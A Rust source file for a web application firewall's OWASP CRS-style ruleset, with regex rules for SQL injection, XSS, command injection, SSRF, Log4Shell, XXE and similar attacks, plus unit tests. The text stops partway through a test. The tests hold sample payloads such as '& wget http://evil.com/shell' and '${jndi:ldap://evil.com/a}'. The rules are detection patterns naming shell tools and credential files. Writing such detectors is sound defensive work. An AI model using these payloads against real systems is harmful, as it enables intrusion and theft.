// Copyright 2026 Rwx-G (Lorica)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Attack category aligned with OWASP CRS rule groups.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleCategory {
    SqlInjection,
    Xss,
    PathTraversal,
    CommandInjection,
    ProtocolViolation,
    SSRF,
    LogInjection,
    XXE,
    IpBlocklist,
    SSTI,
    PrototypePollution,
}

impl RuleCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::SqlInjection => "sql_injection",
            Self::Xss => "xss",
            Self::PathTraversal => "path_traversal",
            Self::CommandInjection => "command_injection",
            Self::ProtocolViolation => "protocol_violation",
            Self::SSRF => "SSRF",
            Self::LogInjection => "log_injection",
            Self::XXE => "XXE",
            Self::IpBlocklist => "ip_blocklist",
            Self::SSTI => "SSTI",
            Self::PrototypePollution => "prototype_pollution",
        }
    }
}

impl std::str::FromStr for RuleCategory {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "sql_injection" => Ok(Self::SqlInjection),
            "xss" => Ok(Self::Xss),
            "path_traversal" => Ok(Self::PathTraversal),
            "command_injection" => Ok(Self::CommandInjection),
            "protocol_violation" => Ok(Self::ProtocolViolation),
            "SSRF" | "ssrf" => Ok(Self::SSRF),
            "log_injection" => Ok(Self::LogInjection),
            "XXE" | "xxe" => Ok(Self::XXE),
            "ip_blocklist" => Ok(Self::IpBlocklist),
            "SSTI" | "ssti" => Ok(Self::SSTI),
            "prototype_pollution" => Ok(Self::PrototypePollution),
            other => Err(format!("unknown rule category: {other}")),
        }
    }
}

/// A single WAF rule with a precompiled regex pattern.
pub struct WafRule {
    /// Unique rule ID (CRS-style numbering).
    pub id: u32,
    /// Human-readable description.
    pub description: &'static str,
    /// Attack category.
    pub category: RuleCategory,
    /// Precompiled regex pattern.
    pub pattern: Regex,
    /// Severity score (1-5, higher = more severe).
    pub severity: u8,
}

impl WafRule {
    /// Whether this rule should be evaluated during body scanning.
    /// Path-specific rules (path traversal, sensitive file access, protocol
    /// violations) are skipped for body content to avoid false positives
    /// on CMS articles, JSON payloads, and form submissions.
    pub fn applies_to_body(&self) -> bool {
        !matches!(
            self.category,
            RuleCategory::PathTraversal | RuleCategory::ProtocolViolation
        )
    }
}

impl std::fmt::Debug for WafRule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("WafRule")
            .field("id", &self.id)
            .field("description", &self.description)
            .field("category", &self.category)
            .field("severity", &self.severity)
            .finish()
    }
}

/// A compiled set of WAF rules ready for evaluation.
pub struct RuleSet {
    rules: Vec<WafRule>,
}

impl RuleSet {
    /// Build the default OWASP CRS-inspired ruleset.
    pub fn default_crs() -> Self {
        let rules = vec![
            // --- SQL Injection (CRS 942xxx) ---
            WafRule {
                id: 942100,
                description: "SQL injection via UNION keyword",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i)\bunion\b[\s/\*]+\b(select|all)\b").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942110,
                description: "SQL injection via comment sequence",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i)('|%27)\s*(--|#|/\*)").unwrap(),
                severity: 4,
            },
            WafRule {
                id: 942120,
                description: "SQL injection via OR/AND with comparison",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i)\b(or|and)\b\s+\d+\s*=\s*\d+").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942130,
                description: "SQL injection via common functions",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)\b(sleep|benchmark|waitfor|delay|load_file|into\s+outfile|into\s+dumpfile)\b\s*\(",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942140,
                description: "SQL injection via DROP/ALTER/TRUNCATE",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)\b(drop|alter|truncate|create)\b\s+\b(table|database|index|view)\b",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942150,
                description: "SQL injection via stacked queries",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i);\s*\b(select|insert|update|delete|drop|alter)\b").unwrap(),
                severity: 4,
            },
            // --- XSS (CRS 941xxx) ---
            WafRule {
                id: 941100,
                description: "XSS via script tag",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)<\s*script[\s>]").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 941110,
                description: "XSS via event handler attribute",
                category: RuleCategory::Xss,
                pattern: Regex::new(
                    r"(?i)\bon(error|load|click|mouse\w+|focus|blur|submit|change|key\w+)\s*=",
                ).unwrap(),
                severity: 4,
            },
            WafRule {
                id: 941120,
                description: "XSS via javascript: URI scheme",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)javascript\s*:").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 941130,
                description: "XSS via data: URI with script content",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)data\s*:\s*text/html").unwrap(),
                severity: 4,
            },
            WafRule {
                id: 941140,
                description: "XSS via iframe/object/embed tag",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)<\s*(iframe|object|embed|applet)[\s>]").unwrap(),
                severity: 4,
            },
            WafRule {
                id: 941150,
                description: "XSS via SVG onload",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)<\s*svg[^>]*\bonload\s*=").unwrap(),
                severity: 4,
            },
            // --- Path Traversal (CRS 930xxx) ---
            WafRule {
                id: 930100,
                description: "Path traversal via dot-dot-slash",
                category: RuleCategory::PathTraversal,
                pattern: Regex::new(r"(\.\./|\.\.\\|%2e%2e[/\\%]|%252e%252e)").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 930110,
                description: "Path traversal via sensitive file access",
                category: RuleCategory::PathTraversal,
                pattern: Regex::new(
                    r"(?i)/(etc/(passwd|shadow|hosts)|proc/self|\.env|\.git/config|wp-config\.php)",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 930120,
                description: "Path traversal via null byte injection",
                category: RuleCategory::PathTraversal,
                pattern: Regex::new(r"(%00|\\x00|\x00)").unwrap(),
                severity: 5,
            },
            // --- Command Injection (CRS 932xxx) ---
            WafRule {
                id: 932100,
                description: "OS command injection via shell operators",
                category: RuleCategory::CommandInjection,
                pattern: Regex::new(r"[;&|`]\s*(cat|ls|id|whoami|wget|curl|nc|bash|sh|python|perl|ruby|php)\b").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 932110,
                description: "OS command injection via backtick/subshell",
                category: RuleCategory::CommandInjection,
                pattern: Regex::new(r"(`[^`]+`|\$\([^)]+\))").unwrap(),
                severity: 4,
            },
            // --- Protocol Violations (CRS 920xxx) ---
            WafRule {
                id: 920100,
                description: "HTTP request smuggling via invalid content-length",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(r"(?i)content-length\s*:\s*[^\d]").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 920110,
                description: "CRLF injection via encoded line break",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(r"(%0d%0a|%0d|%0a|\r\n)").unwrap(),
                severity: 4,
            },
            // --- SSRF (CRS 934xxx) ---
            WafRule {
                id: 934100,
                description: "SSRF via cloud metadata endpoint",
                category: RuleCategory::SSRF,
                pattern: Regex::new(
                    r"(?i)(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200)",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 934110,
                description: "SSRF via localhost/loopback access",
                category: RuleCategory::SSRF,
                pattern: Regex::new(
                    r"(?i)(https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|0x7f))",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 934120,
                description: "SSRF via dangerous URI scheme",
                category: RuleCategory::SSRF,
                pattern: Regex::new(
                    r"(?i)(file|gopher|dict|ftp|ldap|tftp)://"
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 934130,
                description: "SSRF via internal network range",
                category: RuleCategory::SSRF,
                pattern: Regex::new(
                    r"(?i)https?://(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})[:/]",
                ).unwrap(),
                severity: 4,
            },
            // --- Log4Shell / JNDI Injection (CRS 944xxx) ---
            WafRule {
                id: 944100,
                description: "Log4Shell JNDI injection",
                category: RuleCategory::LogInjection,
                pattern: Regex::new(
                    r"(?i)\$\{(\$\{.*\}|jndi|lower|upper|env|sys|date|java).*[:/]",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 944110,
                description: "Log4Shell JNDI protocol lookup",
                category: RuleCategory::LogInjection,
                pattern: Regex::new(
                    r"(?i)jndi\s*:\s*(ldap|ldaps|rmi|dns|iiop|corba|nds|http)s?\s*:",
                ).unwrap(),
                severity: 5,
            },
            // --- XXE (CRS 936xxx) ---
            WafRule {
                id: 936100,
                description: "XXE via DOCTYPE/ENTITY declaration",
                category: RuleCategory::XXE,
                pattern: Regex::new(
                    r"(?i)<!\s*(DOCTYPE|ENTITY)[^>]*(SYSTEM|PUBLIC)",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 936110,
                description: "XXE via XML external entity reference",
                category: RuleCategory::XXE,
                pattern: Regex::new(
                    r#"(?i)<!ENTITY\s+\S+\s+SYSTEM\s+['"]"#,
                ).unwrap(),
                severity: 5,
            },
            // --- SSTI (Server-Side Template Injection, 948xxx) ---
            WafRule {
                id: 948100,
                description: "SSTI via Jinja2/Twig template syntax",
                category: RuleCategory::SSTI,
                pattern: Regex::new(
                    r"(?i)\{\{.*?(__|config|request|self|cycler|joiner|lipsum|namespace)\b",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 948110,
                description: "SSTI via ERB/JSP/EL expression",
                category: RuleCategory::SSTI,
                pattern: Regex::new(
                    r"(?i)(#\{|<%=?|<\?=)\s*.*?(exec|system|Runtime|Process)",
                ).unwrap(),
                severity: 4,
            },
            // --- Prototype Pollution (949xxx) ---
            WafRule {
                id: 949100,
                description: "Prototype pollution via __proto__ or constructor.prototype",
                category: RuleCategory::PrototypePollution,
                pattern: Regex::new(
                    r#"(?i)(__proto__|constructor\s*\[\s*["']prototype["']\]|prototype\s*\.\s*(constructor|polluted))"#,
                ).unwrap(),
                severity: 4,
            },
            // --- Additional SSRF evasion ---
            WafRule {
                id: 934140,
                description: "GraphQL introspection probe",
                category: RuleCategory::SSRF,
                pattern: Regex::new(
                    r"(?i)\{\s*__schema\s*\{|\bintrospectionQuery\b|\b__type\s*\(",
                ).unwrap(),
                severity: 3,
            },
            WafRule {
                id: 934150,
                description: "SSRF via octal/hex/decimal IP encoding",
                category: RuleCategory::SSRF,
                pattern: Regex::new(
                    r"(?i)https?://(0177\.0+\.0+\.0*1|0x7f[0-9a-f]*|2130706433|017700000001)\b",
                ).unwrap(),
                severity: 5,
            },
            // --- Additional Command Injection evasion ---
            WafRule {
                id: 932120,
                description: "Command injection evasion via IFS or decode pipeline",
                category: RuleCategory::CommandInjection,
                pattern: Regex::new(
                    r"(?i)\$\{IFS\}|\bIFS=|\b(printf|xxd|base64)\b\s+.*\|",
                ).unwrap(),
                severity: 4,
            },
            // --- Additional Protocol Violations ---
            WafRule {
                id: 920120,
                description: "Header injection via trusted proxy headers",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(
                    r"(?i)(X-Forwarded-Host|X-Original-URL|X-Rewrite-URL)\s*:.*[;&|<>]",
                ).unwrap(),
                severity: 3,
            },
            WafRule {
                id: 920130,
                description: "Open redirect via URL-encoded external redirect",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(
                    r"(?i)(redirect|url|next|return|goto|dest)\s*=\s*https?%3a%2f%2f",
                ).unwrap(),
                severity: 3,
            },
            // --- Spring4Shell / Java EL (944xxx) ---
            WafRule {
                id: 944120,
                description: "Java Expression Language / Spring4Shell RCE",
                category: RuleCategory::LogInjection,
                pattern: Regex::new(
                    r"(?i)(class\.module\.classLoader|springframework\.beans\.factory|java\.lang\.Runtime)",
                ).unwrap(),
                severity: 5,
            },
            // --- Additional SQL Injection (modern DBs) ---
            WafRule {
                id: 942160,
                description: "SQL injection via XML/JSON database functions",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)\b(extractvalue|updatexml|xmltype|json_keys|json_extract)\b\s*\(",
                ).unwrap(),
                severity: 4,
            },
            // --- SQL Injection: auth bypass & evasion ---
            WafRule {
                id: 942170,
                description: "SQL injection via authentication bypass",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)('|%27)\s*(or|and)\s*('|%27|\d+\s*=\s*\d+|true|1\s*--|'\s*=\s*')",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942180,
                description: "SQL injection via information schema reconnaissance",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)\b(information_schema|sys\.(tables|columns|objects)|pg_catalog|pg_tables|sqlite_master|mysql\.user)\b",
                ).unwrap(),
                severity: 4,
            },
            WafRule {
                id: 942190,
                description: "SQL injection via CHAR/CONCAT/HEX encoding evasion",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)\b(char|chr|concat|concat_ws|hex|unhex|conv)\s*\(\s*\d+",
                ).unwrap(),
                severity: 4,
            },
            // --- NoSQL Injection ---
            WafRule {
                id: 942200,
                description: "NoSQL injection via MongoDB operators",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r#"(?i)(\$(?:ne|eq|gt|lt|gte|lte|in|nin|regex|exists|where|or|and|not|nor)\b|\{\s*["\']?\$(?:gt|ne|regex|where))"#,
                ).unwrap(),
                severity: 5,
            },
            // --- Additional XSS ---
            WafRule {
                id: 941160,
                description: "XSS via JavaScript eval/constructor execution",
                category: RuleCategory::Xss,
                pattern: Regex::new(
                    r"(?i)\b(eval|settimeout|setinterval|function|constructor)\s*\(",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 941170,
                description: "XSS via base64 obfuscated payload",
                category: RuleCategory::Xss,
                pattern: Regex::new(
                    r"(?i)(atob|btoa)\s*\(|data\s*:\s*[^;]*;base64\s*,",
                ).unwrap(),
                severity: 4,
            },
            // --- Backup/sensitive file access ---
            WafRule {
                id: 930130,
                description: "Backup or sensitive file access",
                category: RuleCategory::PathTraversal,
                pattern: Regex::new(
                    r"(?i)\.(bak|backup|old|orig|save|swp|swo|tmp|temp|dist|copy|sql|tar\.gz|zip|rar|7z|log|conf|cfg|ini)\s*$",
                ).unwrap(),
                severity: 5,
            },
            // --- Windows command injection ---
            WafRule {
                id: 932130,
                description: "Command injection via PowerShell/Windows binaries",
                category: RuleCategory::CommandInjection,
                pattern: Regex::new(
                    r"(?i)\b(powershell|cmd\.exe|certutil|bitsadmin|mshta|wscript|cscript|regsvr32|rundll32)\b",
                ).unwrap(),
                severity: 5,
            },
            // --- HTTP request smuggling ---
            WafRule {
                id: 920140,
                description: "HTTP request smuggling via Transfer-Encoding manipulation",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(
                    r"(?i)(transfer-encoding\s*:.*chunked.*chunked|transfer-encoding\s*:.*,|content-length.*transfer-encoding|transfer-encoding.*content-length)",
                ).unwrap(),
                severity: 5,
            },
            // --- Scanner/bot detection ---
            WafRule {
                id: 913100,
                description: "Automated scanner/attack tool detected",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(
                    r"(?i)(nikto|sqlmap|nmap|masscan|dirbuster|gobuster|feroxbuster|nuclei|wpscan|acunetix|nessus|burpsuite|zgrab|httpx|subfinder)",
                ).unwrap(),
                severity: 3,
            },
            // --- Deserialization attacks ---
            WafRule {
                id: 944130,
                description: "PHP/Java deserialization attack",
                category: RuleCategory::LogInjection,
                pattern: Regex::new(
                    r#"(?i)(O:\d+:"[^"]+"|rO0ABX|aced0005|java\.lang\.(ProcessBuilder|Runtime)|php://input|php://filter)"#,
                ).unwrap(),
                severity: 5,
            },
            // --- HTTP method abuse ---
            WafRule {
                id: 920150,
                description: "Dangerous HTTP method (TRACE/DEBUG/WebDAV)",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(
                    r"(?i)^(TRACE|TRACK|CONNECT|DEBUG|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK)\s",
                ).unwrap(),
                severity: 3,
            },
        ];

        Self { rules }
    }

    /// Return a reference to all rules in this set.
    pub fn rules(&self) -> &[WafRule] {
        &self.rules
    }

    /// Return the number of rules in this set.
    pub fn len(&self) -> usize {
        self.rules.len()
    }

    /// Return true if there are no rules.
    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_crs_loads() {
        let rs = RuleSet::default_crs();
        assert!(!rs.is_empty());
        assert!(rs.len() >= 15);
    }

    #[test]
    fn test_rule_categories_present() {
        let rs = RuleSet::default_crs();
        let categories: std::collections::HashSet<_> =
            rs.rules().iter().map(|r| r.category.clone()).collect();
        assert!(categories.contains(&RuleCategory::SqlInjection));
        assert!(categories.contains(&RuleCategory::Xss));
        assert!(categories.contains(&RuleCategory::PathTraversal));
        assert!(categories.contains(&RuleCategory::CommandInjection));
        assert!(categories.contains(&RuleCategory::ProtocolViolation));
        assert!(categories.contains(&RuleCategory::SSRF));
        assert!(categories.contains(&RuleCategory::LogInjection));
        assert!(categories.contains(&RuleCategory::XXE));
        assert!(categories.contains(&RuleCategory::SSTI));
        assert!(categories.contains(&RuleCategory::PrototypePollution));
    }

    // --- SQL Injection detection ---

    #[test]
    fn test_sqli_union_select() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942100).unwrap();
        assert!(rule.pattern.is_match("1 UNION SELECT * FROM users"));
        assert!(rule.pattern.is_match("1 union  select password from admin"));
        assert!(!rule.pattern.is_match("trade union membership"));
    }

    #[test]
    fn test_sqli_comment_sequence() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942110).unwrap();
        assert!(rule.pattern.is_match("admin' --"));
        assert!(rule.pattern.is_match("admin' #"));
        assert!(rule.pattern.is_match("admin' /*"));
    }

    #[test]
    fn test_sqli_or_equals() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942120).unwrap();
        assert!(rule.pattern.is_match("' OR 1=1"));
        assert!(rule.pattern.is_match("' and 2=2"));
        assert!(!rule.pattern.is_match("apples or oranges"));
    }

    #[test]
    fn test_sqli_dangerous_functions() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942130).unwrap();
        assert!(rule.pattern.is_match("SLEEP(5)"));
        assert!(rule.pattern.is_match("benchmark(1000000,md5('test'))"));
        assert!(rule.pattern.is_match("LOAD_FILE('/etc/passwd')"));
    }

    #[test]
    fn test_sqli_ddl_statements() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942140).unwrap();
        assert!(rule.pattern.is_match("DROP TABLE users"));
        assert!(rule.pattern.is_match("alter table sessions"));
        assert!(rule.pattern.is_match("CREATE DATABASE pwned"));
    }

    #[test]
    fn test_sqli_stacked_queries() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942150).unwrap();
        assert!(rule.pattern.is_match("; SELECT * FROM users"));
        assert!(rule.pattern.is_match(";drop table users"));
    }

    // --- XSS detection ---

    #[test]
    fn test_xss_script_tag() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941100).unwrap();
        assert!(rule.pattern.is_match("<script>alert(1)</script>"));
        assert!(rule.pattern.is_match("<SCRIPT src=evil.js>"));
        assert!(!rule.pattern.is_match("noscript"));
    }

    #[test]
    fn test_xss_event_handler() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941110).unwrap();
        assert!(rule.pattern.is_match("onerror=alert(1)"));
        assert!(rule.pattern.is_match("onload=fetch('http://evil')"));
        assert!(rule.pattern.is_match("ONCLICK=steal()"));
    }

    #[test]
    fn test_xss_javascript_uri() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941120).unwrap();
        assert!(rule.pattern.is_match("javascript:alert(1)"));
        assert!(rule.pattern.is_match("JAVASCRIPT : void(0)"));
    }

    #[test]
    fn test_xss_iframe() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941140).unwrap();
        assert!(rule.pattern.is_match("<iframe src=evil.com>"));
        assert!(rule.pattern.is_match("<OBJECT data=x>"));
        assert!(rule.pattern.is_match("<embed src=x>"));
    }

    // --- Path Traversal detection ---

    #[test]
    fn test_path_traversal_dot_dot() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 930100).unwrap();
        assert!(rule.pattern.is_match("../../../etc/passwd"));
        assert!(rule.pattern.is_match("..\\windows\\system32"));
        assert!(rule.pattern.is_match("%2e%2e/"));
        assert!(rule.pattern.is_match("%2e%2e%2f"));
    }

    #[test]
    fn test_path_traversal_sensitive_files() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 930110).unwrap();
        assert!(rule.pattern.is_match("/etc/passwd"));
        assert!(rule.pattern.is_match("/etc/shadow"));
        assert!(rule.pattern.is_match("/proc/self"));
        assert!(rule.pattern.is_match("/.env"));
        assert!(rule.pattern.is_match("/.git/config"));
    }

    #[test]
    fn test_path_traversal_null_byte() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 930120).unwrap();
        assert!(rule.pattern.is_match("file.php%00.jpg"));
    }

    // --- Command Injection detection ---

    #[test]
    fn test_cmdi_shell_operators() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 932100).unwrap();
        assert!(rule.pattern.is_match("; cat /etc/passwd"));
        assert!(rule.pattern.is_match("| whoami"));
        assert!(rule.pattern.is_match("& wget http://evil.com/shell"));
    }

    #[test]
    fn test_cmdi_backtick() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 932110).unwrap();
        assert!(rule.pattern.is_match("`id`"));
        assert!(rule.pattern.is_match("$(cat /etc/passwd)"));
    }

    // --- CRLF Injection ---

    #[test]
    fn test_crlf_injection() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 920110).unwrap();
        assert!(rule.pattern.is_match("header%0d%0ainjected: value"));
        assert!(rule.pattern.is_match("value%0d%0aSet-Cookie: evil"));
        assert!(!rule.pattern.is_match("normal header value"));
    }

    // --- SSRF detection ---

    #[test]
    fn test_ssrf_cloud_metadata() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 934100).unwrap();
        assert!(rule
            .pattern
            .is_match("http://169.254.169.254/latest/meta-data/"));
        assert!(rule
            .pattern
            .is_match("http://metadata.google.internal/computeMetadata/"));
        assert!(!rule.pattern.is_match("http://example.com/page"));
    }

    #[test]
    fn test_ssrf_localhost() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 934110).unwrap();
        assert!(rule.pattern.is_match("http://localhost/admin"));
        assert!(rule.pattern.is_match("http://127.0.0.1:8080/"));
        assert!(rule.pattern.is_match("http://[::1]/secret"));
        assert!(rule.pattern.is_match("http://0.0.0.0/"));
        assert!(!rule.pattern.is_match("http://example.com/"));
    }

    #[test]
    fn test_ssrf_dangerous_scheme() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 934120).unwrap();
        assert!(rule.pattern.is_match("file:///etc/passwd"));
        assert!(rule.pattern.is_match("gopher://evil.com/_GET"));
        assert!(rule.pattern.is_match("dict://evil.com/info"));
        assert!(rule.pattern.is_match("ldap://evil.com/dc=com"));
        assert!(!rule.pattern.is_match("https://example.com/"));
    }

    #[test]
    fn test_ssrf_internal_network() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 934130).unwrap();
        assert!(rule.pattern.is_match("http://10.0.0.1:8080/admin"));
        assert!(rule.pattern.is_match("http://172.16.0.1/"));
        assert!(rule.pattern.is_match("http://192.168.1.1/"));
        assert!(!rule.pattern.is_match("http://8.8.8.8/"));
    }

    // --- Log4Shell / JNDI detection ---

    #[test]
    fn test_log4shell_jndi() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 944100).unwrap();
        assert!(rule.pattern.is_match("${jndi:ldap://evil.com/a}"));
        assert!(rule.pattern.is_match("${${lower:j}ndi:ldap://evil.com}"));
        assert!(rule.pattern.is_match("${jndi:rmi://evil.com/obj}"));
        assert!(!rule.pattern.is_match("${variable}"));
    }

    #[test]
    fn test_log4shell_jndi_protocol() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 944110).unwrap();
        assert!(rule.pattern.is_match("jndi:ldap://evil.com"));
        assert!(rule.pattern.is_match("jndi:rmi://evil.com"));
        assert!(rule.pattern.is_match("jndi:dns://evil.com"));
        assert!(!rule.pattern.is_match("jndi_config=true"));
    }

    // --- XXE detection ---

    #[test]
    fn test_xxe_doctype() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 936100).unwrap();
        assert!(rule
            .pattern
            .is_match("<!DOCTYPE foo SYSTEM \"http://evil.com/xxe.dtd\">"));
        assert!(rule
            .pattern
            .is_match("<!DOCTYPE foo PUBLIC \"-//W3C\" \"http://evil.com\">"));
        assert!(!rule.pattern.is_match("<html>normal page</html>"));
    }

    #[test]
    fn test_xxe_entity() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 936110).unwrap();
        assert!(rule
            .pattern
            .is_match("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
        assert!(rule
            .pattern
            .is_match("<!ENTITY xxe SYSTEM 'http://evil.com/data'>"));
        assert!(!rule.pattern.is_match("<entity>normal xml</entity>"));
    }

    // --- Category as_str ---

    #[test]
    fn test_category_as_str() {
        assert_eq!(RuleCategory::SqlInjection.as_str(), "sql_injection");
        assert_eq!(RuleCategory::Xss.as_str(), "xss");
        assert_eq!(RuleCategory::PathTraversal.as_str(), "path_traversal");
        assert_eq!(RuleCategory::CommandInjection.as_str(), "command_injection");
        assert_eq!(
            RuleCategory::ProtocolViolation.as_str(),
            "protocol_violation"
        );
        assert_eq!(RuleCategory::SSRF.as_str(), "SSRF");
        assert_eq!(RuleCategory::LogInjection.as_str(), "log_injection");
        assert_eq!(RuleCategory::XXE.as_str(), "XXE");
    }

    // --- New rules (v1.0.1) ---

    #[test]
    fn test_sqli_auth_bypass() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942170).unwrap();
        assert!(rule.pattern.is_match("' OR '1'='1"));
        assert!(rule.pattern.is_match("' or true--"));
        assert!(rule.pattern.is_match("%27 OR 1=1"));
        assert!(!rule.pattern.is_match("username=admin"));
    }

    #[test]
    fn test_sqli_info_schema() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942180).unwrap();
        assert!(rule.pattern.is_match("SELECT * FROM information_schema.tables"));
        assert!(rule.pattern.is_match("sqlite_master"));
        assert!(rule.pattern.is_match("pg_catalog"));
        assert!(!rule.pattern.is_match("SELECT name FROM users"));
    }

    #[test]
    fn test_sqli_encoding_evasion() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942190).unwrap();
        assert!(rule.pattern.is_match("CHAR(0x61,0x64)"));
        assert!(rule.pattern.is_match("concat(0x7e,version())"));
        assert!(!rule.pattern.is_match("character set utf8"));
    }

    #[test]
    fn test_nosql_injection() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942200).unwrap();
        assert!(rule.pattern.is_match(r#"{"$gt":""}"#));
        assert!(rule.pattern.is_match("$where"));
        assert!(rule.pattern.is_match("$ne"));
        assert!(!rule.pattern.is_match("total: $100"));
    }

    #[test]
    fn test_xss_eval() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941160).unwrap();
        assert!(rule.pattern.is_match("eval('alert(1)')"));
        assert!(rule.pattern.is_match("setTimeout(payload)"));
        assert!(rule.pattern.is_match("constructor('return this')"));
        assert!(!rule.pattern.is_match("evaluate the results"));
    }

    #[test]
    fn test_xss_base64() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941170).unwrap();
        assert!(rule.pattern.is_match("atob('YWxlcnQ=')"));
        assert!(rule.pattern.is_match("data:text/html;base64,PHNjcmlwdD4="));
        assert!(!rule.pattern.is_match("database connection"));
    }

    #[test]
    fn test_backup_file_access() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 930130).unwrap();
        assert!(rule.pattern.is_match("/config.bak"));
        assert!(rule.pattern.is_match("/dump.sql"));
        assert!(rule.pattern.is_match("/site.tar.gz"));
        assert!(!rule.pattern.is_match("/style.css"));
    }

    #[test]
    fn test_powershell_injection() {
        let rs = RuleSet::default_crs();
